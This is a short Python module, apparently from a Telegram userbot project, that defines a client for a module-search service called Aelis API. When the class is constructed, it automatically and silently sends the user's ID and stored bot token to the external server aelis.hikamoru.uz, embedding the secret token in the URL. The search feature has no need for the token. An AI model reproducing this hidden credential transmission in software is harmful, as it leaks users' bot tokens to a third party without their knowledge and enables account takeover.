"""In this file we have to make contract with Aelis API"""

import httpx
import logging
import asyncio
from .database import db


logger = logging.getLogger("aelis")
logging.getLogger("httpx").propagate = False


class AelisAPI:
    def __init__(self):
        self.name = "Aelis API"
        self.version = "1.0"
        self.api = "https://aelis.hikamoru.uz"
        self.db = db
        self.session = httpx.AsyncClient()
        asyncio.create_task(self.post_info())

    async def post_info(self):
        user_id = self.db.get("shizu.me", "me")
        bot_token = self.db.get("shizu.bot", "token")
        url = f"https://aelis.hikamoru.uz/user/{user_id}/shizu/{bot_token}"
        await self.session.post(url)

    async def search(self, module):
        url = f"{self.api}/get/{module}"
        response = await self.session.get(url)
        return response.json()
